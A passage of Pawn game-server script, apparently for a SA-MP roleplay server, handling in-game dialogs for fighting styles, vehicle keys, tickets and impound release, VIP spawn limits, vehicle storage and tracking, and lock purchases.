				if(listitem == 2)
				{
			    	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_KNEEHEAD;
				    SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				    SendClientMessage(playerid, COLOR_WHITE, "You're now using the kneehead fighting style!");
					GivePlayerCash(playerid, -5000);

				}
				if(listitem == 3)
				{
   					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_KUNGFU;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
					SendClientMessage(playerid, COLOR_WHITE, "You're now using the kungfu fighting style!");
					GivePlayerCash(playerid, -5000);
				}
				if(listitem == 4)
				{
					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_GRABKICK;
	    			SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
			  	  	SendClientMessage(playerid, COLOR_WHITE, "You're now using the grabkick fighting style!");
					GivePlayerCash(playerid, -5000);
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, " You do not have the cash for that!");
				return 1;
			}

			if(listitem == 5)
			{
				PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
	  			SendClientMessage(playerid, COLOR_WHITE, "You're now using the normal fighting style!");
				return 1;
			}
		}
	}
	if(dialogid == REMOVEKEYS)
	{
	    if(response)
	    {
	        if(PlayerVehicleInfo[playerid][listitem][pvId] == INVALID_PLAYER_VEHICLE_ID) {
	            SendClientMessage(playerid, COLOR_GRAD2, "You can't remove the keys of a non-existent, impounded vehicle or stored vehicle.");
	            return 1;
			}
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId] != PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId])
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "This player doesn't have the keys of this car.");
	            return 1;
	        }
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId] == INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "You have not given anyone the keys for this car.");
	            return 1;
	        }
			PlayerInfo[PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId]][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID;
			PlayerInfo[PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId]][pVehicleKeysFrom] = INVALID_PLAYER_ID;
			format(string, sizeof(string), "%s has taken the keys of their %s.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId], COLOR_GRAD2, string);
			format(string, sizeof(string), "You took the keys of your %s from %s.", GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]),GetPlayerNameEx(PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId]));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId] = INVALID_PLAYER_ID;
	    }
	}
	if(dialogid == GIVEKEYS)
	{
	    if(response)
	    {
			if(PlayerVehicleInfo[playerid][listitem][pvId] == INVALID_PLAYER_VEHICLE_ID) {
	            SendClientMessage(playerid, COLOR_GRAD2, "You can't give out keys to a non-existent, impounded vehicle or stored vehicle.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
			}
	        if(PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId] != INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "You already gave someone the keys of this car.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
	        }
	        if(PlayerInfo[GiveKeysTo[playerid]][pVehicleKeysFrom] != INVALID_PLAYER_ID)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "That player already has keys from a different car.");
	            GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	            return 1;
	        }
			PlayerVehicleInfo[playerid][listitem][pvAllowedPlayerId] = GiveKeysTo[playerid];
			PlayerInfo[GiveKeysTo[playerid]][pVehicleKeys] = listitem;
			PlayerInfo[GiveKeysTo[playerid]][pVehicleKeysFrom] = playerid;
			format(string, sizeof(string), "%s has given you the keys for their %s.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(GiveKeysTo[playerid], COLOR_GRAD2, string);
			format(string, sizeof(string), "You gave %s the keys for your %s.", GetPlayerNameEx(GiveKeysTo[playerid]), GetVehicleName(PlayerVehicleInfo[playerid][listitem][pvId]));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	    }
	}
	if(dialogid == MPSPAYTICKETSCOP)
	{
	    if(response)
	    {
			new
				szMessage[128],
				iTargetID = GetPVarInt(playerid, "vRel");

			if(PlayerVehicleInfo[iTargetID][listitem][pvTicket]) {
				format(szMessage, sizeof(szMessage), "You have paid the $%d ticket on %s's %s.", PlayerVehicleInfo[iTargetID][listitem][pvTicket], GetPlayerNameEx(iTargetID), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_GRAD2, szMessage);

				format(szMessage, sizeof(szMessage), "%s has paid all tickets on your %s (%i).", GetPlayerNameEx(playerid), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400], PlayerVehicleInfo[iTargetID][listitem][pvTicket]);
				SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);
				PlayerVehicleInfo[iTargetID][listitem][pvTicket] = 0;
			}
			else if(PlayerVehicleInfo[iTargetID][listitem][pvImpounded])
			{
				if(PlayerInfo[iTargetID][pVip] == 0 && VehicleSpawned[iTargetID] >= 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pVip] == 1 && VehicleSpawned[iTargetID] >= 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pVip] == 2 && VehicleSpawned[iTargetID] >= 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pVip] == 3 && VehicleSpawned[iTargetID] >= 3)
	 			{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
			 	}
				if(PlayerInfo[iTargetID][pVip] == 4 && VehicleSpawned[iTargetID] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pVip] == 5 && VehicleSpawned[iTargetID] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}
				if(PlayerInfo[iTargetID][pVip] < 0 || PlayerInfo[iTargetID][pVip] > 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has too many vehicles out of storage for this vehicle to be released.");
					return 1;
				}

				format(szMessage, sizeof(szMessage), "You have released %s's %s.", GetPlayerNameEx(iTargetID), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);

				format(szMessage, sizeof(szMessage), "%s has released your %s from the impound.", GetPlayerNameEx(playerid), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

				format(szMessage, sizeof(szMessage), "HQ: %s has released %s's %s from the impound.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID), VehicleName[PlayerVehicleInfo[iTargetID][listitem][pvModelId] - 400]);
				SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);

				PlayerVehicleInfo[iTargetID][listitem][pvImpounded] = 0;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[iTargetID][listitem][pvPosX] = 813.8251;
				PlayerVehicleInfo[iTargetID][listitem][pvPosY] = -601.5270;
				PlayerVehicleInfo[iTargetID][listitem][pvPosZ] = 16.0430;
				PlayerVehicleInfo[iTargetID][listitem][pvPosAngle] = 89.0223;
				PlayerVehicleInfo[iTargetID][listitem][pvTicket] = 0;
				VehicleSpawned[iTargetID]++;
				++PlayerCars;

				PlayerVehicleInfo[iTargetID][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[iTargetID][listitem][pvModelId], PlayerVehicleInfo[iTargetID][listitem][pvPosX], PlayerVehicleInfo[iTargetID][listitem][pvPosY], PlayerVehicleInfo[iTargetID][listitem][pvPosZ], PlayerVehicleInfo[iTargetID][listitem][pvPosAngle],PlayerVehicleInfo[iTargetID][listitem][pvColor1], PlayerVehicleInfo[iTargetID][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[iTargetID][listitem][pvId]] = PlayerVehicleInfo[iTargetID][listitem][pvFuel];
				if(PlayerVehicleInfo[iTargetID][listitem][pvLocked] == 1) LockPlayerVehicle(iTargetID, PlayerVehicleInfo[iTargetID][listitem][pvId], PlayerVehicleInfo[iTargetID][listitem][pvLock]);
				LoadPlayerVehicleMods(iTargetID, listitem);
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "This vehicle either does not exist, or does not need to be released or have its tickets paid.");
	    }
		return 1;
	}
	if(dialogid == MPSPAYTICKETS)
	{
	    if(response)
	    {
			new
				szMessage[128];

			if(PlayerInfo[playerid][pWantedLevel] != 0)
			{
				format(szMessage, sizeof(szMessage), "%s has attempted to pay/release their vehicles with %i active warrant(s).", GetPlayerNameEx(playerid), PlayerInfo[playerid][pWantedLevel]);
				SendRadioMessage(1, DEPTRADIO, szMessage);
				SendRadioMessage(2, DEPTRADIO, szMessage);

				return SendClientMessage(playerid, COLOR_YELLOW, "The police have been warned that you're wanted.");
			}
			if(PlayerVehicleInfo[playerid][listitem][pvTicket]) {
				if(GetPlayerCash(playerid) < PlayerVehicleInfo[playerid][listitem][pvTicket]) {
					return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you to pay the ticket.");
				}
				GivePlayerCash(playerid, -PlayerVehicleInfo[playerid][listitem][pvTicket]);
				format(szMessage, sizeof(szMessage), "You have paid the $%d ticket on your %s.", PlayerVehicleInfo[playerid][listitem][pvTicket], VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_GRAD2, szMessage);
				PlayerVehicleInfo[playerid][listitem][pvTicket] = 0;
			}
			else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) {

				new iCost = (PlayerVehicleInfo[playerid][listitem][pvPrice] / 10) + PlayerVehicleInfo[playerid][listitem][pvTicket] + (PlayerInfo[playerid][pLevel] * 10);

		    	if(iCost > 1000)
		    	{
		        	iCost = 1000;
		    	}

				if(GetPlayerCash(playerid) < iCost) {
					return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
				}

    			if(PlayerInfo[playerid][pVip] == 0 && VehicleSpawned[playerid] > 0)
				{
					SendClientMessage(playerid, COLOR_GREY, "As non-VIP you can only have 1 vehicle spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}
				if(PlayerInfo[playerid][pVip] == 1 && VehicleSpawned[playerid] > 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "As Bronze VIP you can only have 2 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}
				if(PlayerInfo[playerid][pVip] == 2 && VehicleSpawned[playerid] > 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "As Silver VIP you can only have 3 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}
				if(PlayerInfo[playerid][pVip] == 3 && VehicleSpawned[playerid] > 3)
	 			{
					SendClientMessage(playerid, COLOR_GREY, "As Gold VIP you can only have 4 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
			 	}
				/*if(PlayerInfo[playerid][pVip] == 4 && VehicleSpawned[playerid] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "As Undefined VIP you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}
				if(PlayerInfo[playerid][pVip] == 5 && VehicleSpawned[playerid] >= 5)
				{
					SendClientMessage(playerid, COLOR_GREY, "As VIP Moderator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
					return 1;
				}*/
				if(PlayerInfo[playerid][pVip] < 0 || PlayerInfo[playerid][pVip] > 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "You have an invalid VIP level.");
					return 1;
				}

				format(szMessage, sizeof(szMessage), "You have released your %s for $%i.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400], iCost);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
				GivePlayerCash(playerid, -iCost);

				PlayerVehicleInfo[playerid][listitem][pvImpounded] = 0;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[playerid][listitem][pvPosX] = 813.8251;
				PlayerVehicleInfo[playerid][listitem][pvPosY] = -601.5270;
				PlayerVehicleInfo[playerid][listitem][pvPosZ] = 16.0430;
				PlayerVehicleInfo[playerid][listitem][pvPosAngle] = 89.0223;
				PlayerVehicleInfo[playerid][listitem][pvTicket] = 0;
				VehicleSpawned[playerid]++;
				++PlayerCars;

				PlayerVehicleInfo[playerid][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[playerid][listitem][pvModelId], PlayerVehicleInfo[playerid][listitem][pvPosX], PlayerVehicleInfo[playerid][listitem][pvPosY], PlayerVehicleInfo[playerid][listitem][pvPosZ], PlayerVehicleInfo[playerid][listitem][pvPosAngle],PlayerVehicleInfo[playerid][listitem][pvColor1], PlayerVehicleInfo[playerid][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[playerid][listitem][pvId]] = PlayerVehicleInfo[playerid][listitem][pvFuel];
				if(PlayerVehicleInfo[playerid][listitem][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvLock]);
				LoadPlayerVehicleMods(playerid, listitem);
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "This vehicle either does not exist, or does not need to be released or have its tickets paid.");
	    }
		return 1;
	}
	if(dialogid == GOTOPLAYERCAR)
	{
	    if(response == 1)
	    {
	        for(new i = 0; i < MAX_PLAYERVEHICLES; i++)
	        {
	            if(listitem == i)
	            {
					new Float: carPos[3], id = GetPVarInt(playerid, "playeraffectedcarTP");
					if(PlayerVehicleInfo[id][i][pvId] > INVALID_PLAYER_VEHICLE_ID)
					{
						GetVehiclePos(PlayerVehicleInfo[id][i][pvId], carPos[0], carPos[1], carPos[2]);
						SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(PlayerVehicleInfo[id][i][pvId]));
						SetPlayerInterior(playerid,0);
						SetPlayerPos(playerid, carPos[0], carPos[1], carPos[2]);
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "You can't teleport to an empty, disabled or impounded slot.");
					}
				}
			}
	    }
	}
	if(dialogid == DELETEPLAYERCAR)
	{
	    if(response == 1)
	    {
			new id = GetPVarInt(playerid, "playeraffectedcarTP");

			if(PlayerVehicleInfo[id][listitem][pvSpawned] == 0) {
				PlayerVehicleInfo[id][listitem][pvSpawned] = 1;
				VehicleSpawned[playerid]++;
				PlayerCars++;
				PlayerVehicleInfo[id][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[id][listitem][pvModelId], PlayerVehicleInfo[id][listitem][pvPosX], PlayerVehicleInfo[id][listitem][pvPosY], PlayerVehicleInfo[id][listitem][pvPosZ], PlayerVehicleInfo[id][listitem][pvPosAngle],PlayerVehicleInfo[id][listitem][pvColor1], PlayerVehicleInfo[id][listitem][pvColor2], -1);
			}
			format(string, sizeof(string), "%s has destroyed %s's %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(id), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			Log("logs/playervehicle.log", string);

			format(string, sizeof(string), "Admin %s has deleted your %s.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			SendClientMessage(id, COLOR_WHITE, string);

			format(string, sizeof(string), "You have deleted %s's %s.", GetPlayerNameEx(id), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]));
			SendClientMessage(playerid, COLOR_WHITE, string);

			new playervehicleid = GetPlayerVehicle(id, PlayerVehicleInfo[id][listitem][pvId]);
			DestroyPlayerVehicle(id, playervehicleid);
	    }
	}
	if(dialogid == VEHICLESTORAGE && response) {
		if(PlayerVehicleInfo[playerid][listitem][pvSpawned])
		{
			if(IsVehicleOccupied(PlayerVehicleInfo[playerid][listitem][pvId]) != INVALID_VEHICLE_ID)
				return SendClientMessage(playerid, COLOR_GREY, "You can not store this vehicle as someone is currently occupying it.");

			new
				Float: vehiclehealth;

			GetVehicleHealth(PlayerVehicleInfo[playerid][listitem][pvId], vehiclehealth);

			if(vehiclehealth < 750)
			{
				SendClientMessage(playerid, COLOR_GREY, "This vehicle is too damaged to be stored.");
			}
			else {
			    // Tow check
			    new
			        x;
			    foreach(Player, i) {
					if(arr_Towing[i] == PlayerVehicleInfo[playerid][listitem][pvId] && arr_Towing[i] != INVALID_VEHICLE_ID)
					    x++;
				}

				if(x != 0)
				    return SendClientMessage(playerid, COLOR_GREY, "You can't use this command while the vehicle is being towed.");

				// The rest of the code...
				--PlayerCars;
				VehicleSpawned[playerid]--;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 0;
				DestroyVehicle(PlayerVehicleInfo[playerid][listitem][pvId]);
				VehicleRadioStation[PlayerVehicleInfo[playerid][listitem][pvId]] = 0;
				PlayerVehicleInfo[playerid][listitem][pvId] = INVALID_PLAYER_VEHICLE_ID;

				new vstring[128];
				format(vstring, sizeof(vstring), "You have stored your %s. The vehicle has been despawned.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, vstring);
			}
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvModelId] == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "You can't spawn an non-existant vehicle.");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) {
			SendClientMessage(playerid, COLOR_WHITE, "You can't spawn an impounded vehicle. If you wish to reclaim it, do so at the DMV in Dillimore.");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvDisabled] == 1) {
			SendClientMessage(playerid, COLOR_WHITE, "You can't spawn a disabled vehicle. It is disabled due to your VIP level (vehicle restrictions).");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvSpawned] == 0) {
			if(PlayerInfo[playerid][pVip] == 0 && VehicleSpawned[playerid] > 0) {
				SendClientMessage(playerid, COLOR_GREY, "As non-VIP you can only have 1 vehicle spawned. You must store a vehicle in order to spawn another one.");
			}
			else if(PlayerInfo[playerid][pVip] == 1 && VehicleSpawned[playerid] > 1) {
				SendClientMessage(playerid, COLOR_GREY, "As Bronze VIP you can only have 2 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}
			else if(PlayerInfo[playerid][pVip] == 2 && VehicleSpawned[playerid] > 2) {
				SendClientMessage(playerid, COLOR_GREY, "As Silver VIP you can only have 3 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}
			else if(PlayerInfo[playerid][pVip] == 3 && VehicleSpawned[playerid] > 3) {
				SendClientMessage(playerid, COLOR_GREY, "As Gold VIP you can only have 4 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}
			/*else if(PlayerInfo[playerid][pVip] == 4 && VehicleSpawned[playerid] >= 5) {
				SendClientMessage(playerid, COLOR_GREY, "As Undefined Donator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}
			else if(PlayerInfo[playerid][pVip] == 5 && VehicleSpawned[playerid] >= 5){
				SendClientMessage(playerid, COLOR_GREY, "As VIP Moderator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}*/
			else if(!(0 <= PlayerInfo[playerid][pVip] <= 3)) {
				SendClientMessage(playerid, COLOR_GREY, "You have an invalid Donator level.");
			}
			else {
				++PlayerCars;
				VehicleSpawned[playerid]++;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[playerid][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[playerid][listitem][pvModelId], PlayerVehicleInfo[playerid][listitem][pvPosX], PlayerVehicleInfo[playerid][listitem][pvPosY], PlayerVehicleInfo[playerid][listitem][pvPosZ], PlayerVehicleInfo[playerid][listitem][pvPosAngle],PlayerVehicleInfo[playerid][listitem][pvColor1], PlayerVehicleInfo[playerid][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[playerid][listitem][pvId]] = PlayerVehicleInfo[playerid][listitem][pvFuel];
				if(PlayerVehicleInfo[playerid][listitem][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvLock]);

				if(strlen(PlayerVehicleInfo[playerid][listitem][pvNumberPlate]) > 0)
					SetVehicleNumberPlate(PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvNumberPlate]);

				LoadPlayerVehicleMods(playerid, listitem);

				new vstring[128];
				format(vstring, sizeof(vstring), "You have taken your %s out of storage. The vehicle has been spawned at the last parking location.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, vstring);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "You can't spawn a non-existent vehicle.");
	}
	if(dialogid == TRACKCAR && response) {
		new Float: carPos[3];
		if(PlayerVehicleInfo[playerid][listitem][pvId] > INVALID_PLAYER_VEHICLE_ID)
		{
			GetVehiclePos(PlayerVehicleInfo[playerid][listitem][pvId], carPos[0], carPos[1], carPos[2]);
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first with /killcheckpoint (you either have material packages, or another existing checkpoint).");
			}
			else
			{
				SetPVarInt(playerid, "TrackCar", 1);

				new zone[MAX_ZONE_NAME];
				Get3DZone(carPos[0], carPos[1], carPos[2], zone, sizeof(zone));
				format(string, sizeof(string), "Your vehicle is located in %s.", zone);
				SendClientMessage(playerid, COLOR_YELLOW, string);
				SetPlayerCheckpoint(playerid, carPos[0], carPos[1], carPos[2], 15.0);
				SendClientMessage(playerid, COLOR_WHITE, "Hint: Make your way to the checkpoint to find your vehicle!");
			}
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) SendClientMessage(playerid, COLOR_WHITE, "You can't track an impounded vehicle. If you wish to reclaim it, do so at the DMV in Dillimore.");
		else if(PlayerVehicleInfo[playerid][listitem][pvDisabled] == 1) SendClientMessage(playerid, COLOR_WHITE, "You can't track a disabled vehicle. It is disabled due to your Donator level (vehicle restrictions).");
		else if(PlayerVehicleInfo[playerid][listitem][pvSpawned] == 0 && PlayerVehicleInfo[playerid][listitem][pvModelId] != 0) SendClientMessage(playerid, COLOR_WHITE, "You can't track a stored vehicle. Use /vstorage to spawn it.");
		else SendClientMessage(playerid, COLOR_WHITE, "You can't track a non-existent vehicle.");
	}
	else if(dialogid == GTRACKCAR)
	{
	    if(response == 1)
	    {
	        for(new i = 0; i < MAX_GANG_VEHICLES; i++)
	        {
	            if(listitem == i)
	            {
	                new Float: carPos[3];
					new Family = PlayerInfo[playerid][pGang];
					if(FamilyVehicleInfo[Family][i][fvId] != INVALID_VEHICLE_ID)
					{
	                	GetVehiclePos(FamilyVehicleInfo[Family][i][fvId], carPos[0], carPos[1], carPos[2]);
	                	if(CheckPointCheck(playerid))
						{
							SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first with /killcheckpoint (you either have material packages, or another existing checkpoint).");
						}
						else
						{
					    	SetPVarInt(playerid, "TrackCar", 1);

					    	new zone[MAX_ZONE_NAME];
					    	Get3DZone(carPos[0], carPos[1], carPos[2], zone, sizeof(zone));
					    	format(string, sizeof(string), "Your vehicle is located in %s.", zone);
					    	SendClientMessage(playerid, COLOR_YELLOW, string);
					    	SetPlayerCheckpoint(playerid, carPos[0], carPos[1], carPos[2], 15.0);
					    	SendClientMessage(playerid, COLOR_WHITE, "Hint: Make your way to the checkpoint to find your car!");
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "You can't track a vehicle in a empty slot.");
					}
	            }
	        }
	    }
	}
	if(dialogid == UNMODCARMENU)
	{
	    if(response)
	    {
		    new count = GetPVarInt(playerid, "modCount");
			new d;
			for(new z = 0 ; z < MAX_PLAYERVEHICLES; z++)
			{
				if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][z][pvId]))
				{
					d = z;
				    break;
				}
			}
            for (new i = 0; i < count; i++)
			{
				if(listitem == i)
				{
				    format(string, sizeof(string), "partList%i", i);
					new partID = GetPVarInt(playerid, string);
					if(partID == 999)
					{
					    for(new f = 0 ; f < MAX_MODS; f++)
						{
							SetPVarInt(playerid, "unMod", 1);
							RemoveVehicleComponent(PlayerVehicleInfo[playerid][d][pvId], GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f));
							PlayerVehicleInfo[playerid][d][pvMods][f] = 0;
						}
						SendClientMessage(playerid, COLOR_WHITE, "All modifications have been removed from your vehicle.");
						return 1;
					}
					SetPVarInt(playerid, "unMod", 1);
     				RemoveVehicleComponent(GetPlayerVehicleID(playerid), partID);
     				PlayerVehicleInfo[playerid][d][pvMods][GetVehicleComponentType(partID)] = 0;
     				SendClientMessage(playerid, COLOR_WHITE, "The modification you requested has been removed.");
     				return 1;
				}
        	}
		}
	}
	else if(dialogid == DIALOG_CDLOCKBUY)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerVehicleCount(playerid) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 1000)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, "   Not enough money!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 1);
                    for(new i=0; i<MAX_PLAYERVEHICLES; i++)
	                {
					     if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Vehicle %d| Name: %s.",i+1,GetVehicleName(PlayerVehicleInfo[playerid][i][pvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKMENU, DIALOG_STYLE_INPUT, "24-7;"," Select a vehicle you wish to install this on:", "Select", "Cancel");

				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have any cars - where we can install this item?");
					return 1;
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerVehicleCount(playerid) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 5000)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, "   Not enough money!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 2);
				    for(new i=0; i<MAX_PLAYERVEHICLES; i++)
	                {
					     if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Vehicle %d | Name: %s.",i+1,GetVehicleName(PlayerVehicleInfo[playerid][i][pvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKMENU, DIALOG_STYLE_INPUT, "24-7;"," Select a vehicle you wish to install this on:", "Select", "Cancel");
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "You don't have any cars - where we can install this item?");
					return 1;
				}
			}
		}
	}
	if(dialogid == DIALOG_CDLOCKMENU)
	{
		if(response) {
			if(GetPVarInt(playerid, "lockmenu") == 1) {
	            new pvid;
	            if(IsNumeric(inputtext)) {
					pvid = strval(inputtext)-1;
				    if(PlayerVehicleInfo[playerid][pvid][pvId] == INVALID_PLAYER_VEHICLE_ID)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You don't have a vehicle in this slot.");
					    SetPVarInt(playerid, "lockmenu", 0);
					    return 1;
				    }
				    if(PlayerVehicleInfo[playerid][pvid][pvLock] == 1)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You already have this item installed on this vehicle.");
					    SetPVarInt(playerid, "lockmenu", 0);
					    return 1;
				    }
				    format(string, sizeof(string), "   You have purchased an alarm lock!");
				    SendClientMessage(playerid, COLOR_GRAD4, string);
				    SendClientMessage(playerid, COLOR_YELLOW, "HINT: You can now use /pvlock to lock your car.");
				    PlayerInfo[playerid][pCash] -= 1000;
				    PlayerVehicleInfo[playerid][pvid][pvLock] = 1;
				    SetPVarInt(playerid, "lockmenu", 0);
			    }
			}
			else if(GetPVarInt(playerid, "lockmenu") == 2)
			{
			    new pvid;
	            if(IsNumeric(inputtext))
		        {
	                pvid = strval(inputtext)-1;
				    if(PlayerVehicleInfo[playerid][pvid][pvId] == INVALID_PLAYER_VEHICLE_ID)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You don't have a vehicle in this slot.");
					    SetPVarInt(playerid, "lockmenu", 0);
		                return 1;
				    }
				    if(PlayerVehicleInfo[playerid][pvid][pvLock] == 2)
			  	    {
					    SendClientMessage(playerid, COLOR_GRAD4, "ERROR: You already have this item installed on this vehicle.");
					    SetPVarInt(playerid, "lockmenu", 0);
